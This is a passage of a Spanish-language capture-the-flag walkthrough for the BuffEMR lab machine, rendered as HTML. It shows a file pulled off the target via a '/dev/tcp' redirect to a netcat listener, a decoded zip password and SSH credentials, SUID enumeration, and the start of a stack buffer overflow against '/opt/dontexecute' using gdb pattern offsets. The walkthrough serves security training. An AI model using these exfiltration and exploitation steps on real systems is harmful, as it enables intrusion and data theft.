+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a><span class="fu">cat</span> <span class="op">&lt;</span> user.zip <span class="op">&gt;</span> /dev/tcp/192.168.6.5/1234</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a><span class="ex">www-data@buffemr</span>:/var$ </span></code></pre></div>
+<div class="sourceCode" id="cb16"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 1234 <span class="op">&gt;</span> user.zip</span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 1234 ...</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="ex">connect</span> to [192.168.6.5] from (UNKNOWN) [<span class="ex">192.168.6.165</span>] 37168</span></code></pre></div>
+<p>Vemos lo que contiene dentro.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>❯ <span class="ex">7z</span> l user.zip</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>l</td>
+<td>indica que se desea listar el contenido.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb18"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a><span class="ex">7-Zip</span> [64] 16.02 : Copyright (c) <span class="ex">1999-2016</span> Igor Pavlov : 2016-05-21</span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a><span class="ex">p7zip</span> Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 5 2600 Six-Core Processor             (800F82),<span class="ex">ASM</span>,AES-NI)</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a><span class="ex">Scanning</span> the drive for archives:</span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a><span class="ex">1</span> file, 309 bytes (1 KiB)</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true"></a></span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true"></a><span class="ex">Listing</span> archive: user.zip</span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true"></a></span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true"></a><span class="ex">--</span></span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true"></a><span class="ex">Path</span> = user.zip</span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true"></a><span class="ex">Type</span> = zip</span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true"></a><span class="ex">Physical</span> Size = 309</span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true"></a></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true"></a>   <span class="ex">Date</span>      Time    Attr         Size   Compressed  Name</span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true"></a><span class="ex">-------------------</span> ----- ------------ ------------  ------------------------</span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true"></a><span class="ex">2021-06-21</span> 20:11:18 .....          146          127  user.lst</span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true"></a><span class="ex">-------------------</span> ----- ------------ ------------  ------------------------</span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true"></a><span class="ex">2021-06-21</span> 20:11:18                146          127  1 files</span></code></pre></div>
+<p>Pero al tratar de descomprimirlo nos pide una contraseña.</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>❯ <span class="ex">7z</span> x user.zip</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>x</td>
+<td>Indica que se desea extraer los archivos.</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a><span class="ex">7-Zip</span> [64] 16.02 : Copyright (c) <span class="ex">1999-2016</span> Igor Pavlov : 2016-05-21</span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">p7zip</span> Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,6 CPUs AMD Ryzen 5 2600 Six-Core Processor             (800F82),<span class="ex">ASM</span>,AES-NI)</span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true"></a><span class="ex">Scanning</span> the drive for archives:</span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true"></a><span class="ex">1</span> file, 309 bytes (1 KiB)</span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true"></a></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true"></a><span class="ex">Extracting</span> archive: user.zip</span>
+<span id="cb20-8"><a href="#cb20-8" aria-hidden="true"></a><span class="ex">--</span></span>
+<span id="cb20-9"><a href="#cb20-9" aria-hidden="true"></a><span class="ex">Path</span> = user.zip</span>
+<span id="cb20-10"><a href="#cb20-10" aria-hidden="true"></a><span class="ex">Type</span> = zip</span>
+<span id="cb20-11"><a href="#cb20-11" aria-hidden="true"></a><span class="ex">Physical</span> Size = 309</span>
+<span id="cb20-12"><a href="#cb20-12" aria-hidden="true"></a></span>
+<span id="cb20-13"><a href="#cb20-13" aria-hidden="true"></a>    </span>
+<span id="cb20-14"><a href="#cb20-14" aria-hidden="true"></a><span class="ex">Enter</span> password (will not be echoed)<span class="bu">:</span></span></code></pre></div>
+<p>Buscando dentro del contenido del FTP por palabras como <strong>key</strong>, <strong>pass</strong> etc, vemos una supuesta contraseña en <strong>base64</strong>.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a>❯ <span class="fu">grep</span> -riE <span class="st">&quot;key|pass&quot;</span></span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-r</td>
+<td>busca de forma recursiva en todos los archivos.</td>
+</tr>
+<tr class="even">
+<td>-i</td>
+<td>Realiza una búsqueda insensible a mayúsculas y minúsculas.</td>
+</tr>
+<tr class="odd">
+<td>-E</td>
+<td>habilita el uso de expresiones regulares extendidas, en este caso buscará por más de una palabra.</td>
+</tr>
+</tbody>
+</table>
+<img src="Img/Pasted image 20240516124115.png">
+<p>Si decodificamos esa clave, y la pasamos al archivo <strong>.zip</strong>, no funciona.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a>❯ <span class="bu">echo</span> <span class="st">&quot;c2FuM25jcnlwdDNkCg==&quot;</span> <span class="kw">|</span> <span class="ex">base64</span> -d</span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="ex">san3ncrypt3d</span></span></code></pre></div>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a><span class="ex">Enter</span> password (will not be echoed)<span class="bu">:</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true"></a><span class="ex">ERROR</span>: Wrong password : user.lst</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true"></a>               </span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true"></a><span class="ex">Sub</span> items Errors: 1</span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true"></a></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true"></a><span class="ex">Archives</span> with Errors: 1</span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true"></a></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true"></a><span class="ex">Sub</span> items Errors: 1</span></code></pre></div>
+<p>No obstante, si probamos con la clave sin decodificar, si que funciona.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="ex">Enter</span> password (will not be echoed)<span class="bu">:</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="ex">Everything</span> is Ok</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="ex">Size</span>:       146</span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true"></a><span class="ex">Compressed</span>: 309</span></code></pre></div>
+<p>Viendo lo que contiene el archivo, nos fijamos que son otras credenciales, pero para un <strong>SSH</strong>.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a>❯ <span class="ex">catn</span> user.lst</span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">This</span> file contain senstive information, therefore, should be always encrypted at rest.</span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="ex">buffemr</span> - Iamgr00t</span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true"></a></span>
+<span id="cb25-6"><a href="#cb25-6" aria-hidden="true"></a><span class="ex">******</span> Only I can SSH in ************</span></code></pre></div>
+<p>Accedemos vía <strong>SSH</strong> con las credenciales obtenidas, y funciona.</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true"></a>❯ <span class="fu">ssh</span> buffemr@192.168.6.165</span>
+<span id="cb26-2"><a href="#cb26-2" aria-hidden="true"></a><span class="ex">buffemr@192.168.6.165</span><span class="st">&#39;s password: </span></span>
+<span id="cb26-3"><a href="#cb26-3" aria-hidden="true"></a><span class="st">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span></span>
+<span id="cb26-4"><a href="#cb26-4" aria-hidden="true"></a></span>
+<span id="cb26-5"><a href="#cb26-5" aria-hidden="true"></a><span class="st"> * Documentation:  https://help.ubuntu.com</span></span>
+<span id="cb26-6"><a href="#cb26-6" aria-hidden="true"></a><span class="st"> * Management:     https://landscape.canonical.com</span></span>
+<span id="cb26-7"><a href="#cb26-7" aria-hidden="true"></a><span class="st"> * Support:        https://ubuntu.com/advantage</span></span>
+<span id="cb26-8"><a href="#cb26-8" aria-hidden="true"></a></span>
+<span id="cb26-9"><a href="#cb26-9" aria-hidden="true"></a></span>
+<span id="cb26-10"><a href="#cb26-10" aria-hidden="true"></a><span class="st"> * Canonical Livepatch is available for installation.</span></span>
+<span id="cb26-11"><a href="#cb26-11" aria-hidden="true"></a><span class="st">   - Reduce system reboots and improve kernel security. Activate at:</span></span>
+<span id="cb26-12"><a href="#cb26-12" aria-hidden="true"></a><span class="st">     https://ubuntu.com/livepatch</span></span>
+<span id="cb26-13"><a href="#cb26-13" aria-hidden="true"></a></span>
+<span id="cb26-14"><a href="#cb26-14" aria-hidden="true"></a><span class="st">426 packages can be updated.</span></span>
+<span id="cb26-15"><a href="#cb26-15" aria-hidden="true"></a><span class="st">350 updates are security updates.</span></span>
+<span id="cb26-16"><a href="#cb26-16" aria-hidden="true"></a></span>
+<span id="cb26-17"><a href="#cb26-17" aria-hidden="true"></a><span class="st">New release &#39;</span>20.04.6 LTS<span class="st">&#39; available.</span></span>
+<span id="cb26-18"><a href="#cb26-18" aria-hidden="true"></a><span class="st">Run &#39;</span>do-release-upgrade<span class="st">&#39; to upgrade to it.</span></span>
+<span id="cb26-19"><a href="#cb26-19" aria-hidden="true"></a></span>
+<span id="cb26-20"><a href="#cb26-20" aria-hidden="true"></a><span class="st">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span></span>
+<span id="cb26-21"><a href="#cb26-21" aria-hidden="true"></a><span class="st">Last login: Thu May 16 02:02:53 2024 from 192.168.6.5</span></span>
+<span id="cb26-22"><a href="#cb26-22" aria-hidden="true"></a><span class="st">buffemr@buffemr:~$ </span></span></code></pre></div>
+<p>Pudiendo ver la primera flag.</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:~$ cat user_flag.txt </span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true"></a>    <span class="ex">.-.</span>    ))    <span class="ex">wWw</span> <span class="dt">\\\ </span> ///      wWw <span class="dt">\\\ </span>   ///()<span class="fu">_()</span>                                                                 </span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true"></a>  <span class="ex">c</span>(O_O)<span class="ex">c</span> (o0)<span class="ex">-.</span> (O)<span class="ex">_</span>((O)<span class="kw">(</span><span class="ex">O</span><span class="kw">)</span>)      <span class="kw">(</span><span class="ex">O</span><span class="kw">)</span><span class="ex">_</span>((O)  <span class="kw">(</span><span class="ex">O</span><span class="kw">)</span>)<span class="kw">(</span><span class="ex">O</span> o<span class="kw">)</span>                                                                 </span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true"></a> ,<span class="st">&#39;.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 </span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true"></a><span class="st">/ /|_|_|\ \| .-&#39;</span><span class="ex">/</span> (   <span class="kw">||</span><span class="dt">\\</span><span class="kw">||</span>      <span class="ex">/</span> (   <span class="kw">||</span><span class="dt">\\</span><span class="ex">/</span>/<span class="kw">||</span>  <span class="kw">|(</span><span class="ex">_</span><span class="kw">)</span>)                                                                </span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true"></a><span class="kw">|</span> \<span class="ex">_____/</span> <span class="kw">||(</span>  <span class="kw">(</span>  <span class="ex">_</span><span class="kw">)</span>  <span class="kw">||</span> <span class="ex">\ </span><span class="kw">|</span>     <span class="kw">(</span>  <span class="ex">_</span><span class="kw">)</span>  <span class="kw">||</span> \<span class="ex">/</span> <span class="kw">||</span>  <span class="kw">|</span>  <span class="ex">/</span>                                                                 </span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true"></a><span class="st">&#39;. `---&#39;</span> <span class="ex">.</span><span class="kw">`</span> <span class="dt">\)</span>  <span class="ex">\ </span>\_  <span class="kw">||</span>  <span class="kw">||</span>      <span class="ex">\ </span>\_  <span class="kw">||</span>    <span class="kw">||</span>  )<span class="kw">|</span><span class="dt">\\</span>                                                                 </span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true"></a>  <span class="kw">`</span>-...-<span class="st">&#39;   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                </span></span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true"></a><span class="st"> wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     </span></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true"></a><span class="st"> (O)  (O) /  _)-&lt;  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-&lt;  (O)_/||_   </span></span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true"></a><span class="st"> / )  ( \ \__ `.   / __)|^_\      ,&#39;</span>.--.<span class="kw">)</span> ,<span class="st">&#39;.---.`, | \  / |  | (_))|^_\  ,&#39;</span><span class="ex">.---.</span><span class="kw">`</span>, <span class="kw">|</span> <span class="ex">\ </span> / <span class="kw">|</span>  <span class="kw">(</span><span class="ex">..</span><span class="kw">)</span> \<span class="ex">__</span> <span class="kw">`</span>.   / __)<span class="ex">/o_</span>)  </span>
+<span id="cb27-12"><a href="#cb27-12" aria-hidden="true"></a><span class="ex">/</span> /    <span class="dt">\ \ </span>  <span class="kw">`</span><span class="bu">.</span> <span class="kw">|</span> <span class="ex">/</span> (   <span class="kw">|(</span><span class="ex">_</span><span class="kw">)</span>)    <span class="ex">/</span> //_<span class="kw">|</span><span class="ex">_</span>\/ /<span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">_</span><span class="kw">|</span><span class="ex">\ </span><span class="dt">\|</span><span class="kw">|</span><span class="dt">\\</span><span class="ex">/</span>/<span class="kw">||</span>  <span class="kw">|</span> <span class="ex">.-</span><span class="st">&#39; |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  </span></span>
+<span id="cb27-13"><a href="#cb27-13" aria-hidden="true"></a><span class="st">| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) </span></span>
+<span id="cb27-14"><a href="#cb27-14" aria-hidden="true"></a><span class="st">&#39;</span>. <span class="kw">`</span>--<span class="st">&#39; .`,-&#39;</span>   <span class="kw">|</span> <span class="ex">\ </span>\_  )<span class="kw">|</span><span class="dt">\\</span>     <span class="st">&#39;.    ) &#39;</span><span class="bu">.</span> <span class="kw">`</span><span class="ex">---</span><span class="st">&#39; .`||    ||   \)   )|\\ &#39;</span>. <span class="kw">`</span><span class="ex">---</span><span class="st">&#39; .`||    || (_/\_),-&#39;</span>   <span class="kw">|</span> <span class="ex">\ </span>\_ <span class="kw">|</span> <span class="kw">|</span><span class="ex">//</span>  </span>
+<span id="cb27-15"><a href="#cb27-15" aria-hidden="true"></a>  <span class="kw">`</span><span class="ex">-..-</span><span class="st">&#39; (_..--&#39;</span>   \__)<span class="kw">(</span><span class="ex">/</span>  <span class="dt">\)</span>      <span class="kw">`</span><span class="ex">-.</span><span class="st">&#39;    `-...-&#39;</span> (_/    \_)  <span class="kw">(</span>   <span class="kw">(</span><span class="ex">/</span>  <span class="dt">\)</span>  <span class="kw">`</span><span class="ex">-...-</span><span class="st">&#39; (_/    \_)     (_..--&#39;</span>   \__)\<span class="ex">__/</span>   </span>
+<span id="cb27-16"><a href="#cb27-16" aria-hidden="true"></a></span>
+<span id="cb27-17"><a href="#cb27-17" aria-hidden="true"></a></span>
+<span id="cb27-18"><a href="#cb27-18" aria-hidden="true"></a></span>
+<span id="cb27-19"><a href="#cb27-19" aria-hidden="true"></a><span class="ex">COnGRATS</span> !! lETs get ROOT now ....!!</span>
+<span id="cb27-20"><a href="#cb27-20" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:~$ </span></code></pre></div>
+<h2>Post-explotación</h2>
+<p>Mirando los archivos con permisos <strong>SUID</strong>.</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ find / -perm -4000 <span class="op">2&gt;</span>/dev/null</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>find /</td>
+<td>Inicia la búsqueda desde la raíz “/”.</td>
+</tr>
+<tr class="even">
+<td>-perm -4000</td>
+<td>Busca archivos que tienen el bit SUID establecido.</td>
+</tr>
+<tr class="odd">
+<td>2&gt;/dev/null</td>
+<td>Redirige los mensajes de error “/dev/null”.</td>
+</tr>
+</tbody>
+</table>
+<p>Vemos un archivo con el nombre <strong>dontexecute</strong>, (como somos buena gente no lo ejecutamos).</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true"></a><span class="ex">/snap/snapd/21465/usr/lib/snapd/snap-confine</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true"></a><span class="ex">/opt/dontexecute</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ </span></code></pre></div>
+<p>Vemos que es un binario de <strong>32</strong> bits.</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ ls -l /opt/dontexecute </span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true"></a><span class="ex">-rwsrwxr-x</span> 1 root root 7700 Jun 23  2021 /opt/dontexecute</span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ file /opt/dontexecute</span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true"></a><span class="ex">/opt</span>/dontexecute: <span class="ex">setuid</span> ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), <span class="ex">dynamically</span> linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c8287c844acebae4ece08e8c7eefc341e8972e4, not stripped</span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ </span></code></pre></div>
+<p>Tras ejecutarlo, nos pide que agreguemos un argumento.</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ /opt/dontexecute </span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true"></a><span class="ex">Usage</span>: ./dontexecute argumentbuffemr@buffemr:/$ /opt/dontexecute <span class="kw">;</span><span class="bu">echo</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true"></a><span class="ex">Usage</span>: ./dontexecute argument</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ </span></code></pre></div>
+<p>Al añadir un argumento, vemos que no pasa nada.</p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ /opt/dontexecute whoami<span class="kw">;</span><span class="bu">echo</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true"></a></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$</span></code></pre></div>
+<p>Si agregamos múltiples caracteres, llega un punto en que el programa no responde.</p>
+<div class="sourceCode" id="cb33"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ /opt/dontexecute <span class="va">$(</span><span class="ex">python</span> -c <span class="st">&#39;print &quot;A&quot;*200&#39;</span><span class="va">)</span><span class="kw">;</span><span class="bu">echo</span></span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ /opt/dontexecute <span class="va">$(</span><span class="ex">python</span> -c <span class="st">&#39;print &quot;A&quot;*1000&#39;</span><span class="va">)</span><span class="kw">;</span><span class="bu">echo</span></span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true"></a><span class="ex">Segmentation</span> fault (core dumped)</span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true"></a></span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true"></a><span class="ex">buffemr@buffemr</span>:/$ </span></code></pre></div>
+<p>Esto sucede ya que el registro <strong>EIP</strong> apunta a una dirección de memoria inexistente.</p>
+<p>Es decir, que al enviar las múltiples <strong>AAAA</strong> llega un punto en el que el registro <strong>EIP</strong> valdrá <strong>x41</strong> (la letra ‘A’ en hexadecimal), y dado que el registro <strong>EIP</strong> guarda la dirección de la siguiente instrucción a ejecutar, el programa tras tratar de ejecutar la dirección <strong>0x41414141</strong>, que no existe, este colapsa.</p>
+<p>Nos enviamos el binario a nuestra máquina para poder trabajar con este.</p>
+<img src="Img/Pasted image 20240516164414.png">
+<p>Teniendo el binario, vamos a mirarlo de forma mas clara utilizando la herramienta <strong>gdb</strong>, que permite ver lo que está ocurriendo dentro de un programa mientras es ejecutado.</p>
+<div class="sourceCode" id="cb34"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true"></a>❯ <span class="fu">gdb</span> -q dontexecute</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-q</td>
+<td>No muestra el mensaje de bienvenida al iniciar</td>
+</tr>
+</tbody>
+</table>
+<div class="sourceCode" id="cb35"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true"></a><span class="ex">GEF</span> for linux ready, type <span class="kw">`</span><span class="ex">gef</span><span class="st">&#39; to start, `gef config&#39;</span> to configure</span>
+<span id="cb35-2"><a href="#cb35-2" aria-hidden="true"></a><span class="ex">88</span> commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9</span>
+<span id="cb35-3"><a href="#cb35-3" aria-hidden="true"></a><span class="ex">Reading</span> symbols from dontexecute...</span>
+<span id="cb35-4"><a href="#cb35-4" aria-hidden="true"></a><span class="kw">(</span><span class="ex">No</span> debugging symbols found in dontexecute<span class="kw">)</span></span>
+<span id="cb35-5"><a href="#cb35-5" aria-hidden="true"></a><span class="ex">gef</span>➤  </span></code></pre></div>
+<p>Ejecutamos el binario enviándole múltiples letras “A” para tratar de colapsar el programa.</p>
+<div class="sourceCode" id="cb36"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true"></a><span class="ex">gef</span>➤  r <span class="va">$(</span><span class="ex">python3</span> -c <span class="st">&#39;print(&quot;A&quot;*1000)&#39;</span><span class="va">)</span></span></code></pre></div>
+<p>Aquí vemos los diferentes registros de memoria teniendo el valor de las letras <strong>AAAAA</strong>.</p>
+<img src="Img/Pasted image 20240516164942.png">
+<p>Nuestro objetivo ahora, es poder controlar el flujo del programa, es decir, llegar al <strong>EIP</strong>, para luego redirigir el flujo a donde queramos.</p>
+<p>Para poder controlar el <strong>EIP</strong>, primero necesitamos determinar la cantidad de caracteres necesarios antes de comenzar a sobrescribir el <strong>EIP</strong>, esta cantidad de caracteres se conoce como el <strong>offset</strong>.</p>
+<p>Para ello utilizaremos <strong>pattern create</strong> para generar un patrón de caracteres.</p>
+<div class="sourceCode" id="cb37"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="ex">gef</span>➤  patter create 1000</span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true"></a>[<span class="ex">+</span>] Generating a pattern of 1000 bytes (n=4)</span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true"></a><span class="ex">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj</span></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true"></a>[<span class="ex">+</span>] Saved as <span class="st">&#39;$_gef0&#39;</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true"></a><span class="ex">gef</span>➤  </span></code></pre></div>
+<p>Enviamos el patrón.</p>
+<img src="Img/Pasted image 20240516174245.png">
+<p>Y ahora como vemos, el registro <strong>EIP</strong> vale “daaf”.</p>
+<img src="Img/Pasted image 20240516174344.png">
+<p>Con <strong>pattern offset</strong> vemos los caracteres que hay antes de llegar al registro <strong>EIP</strong>.</p>
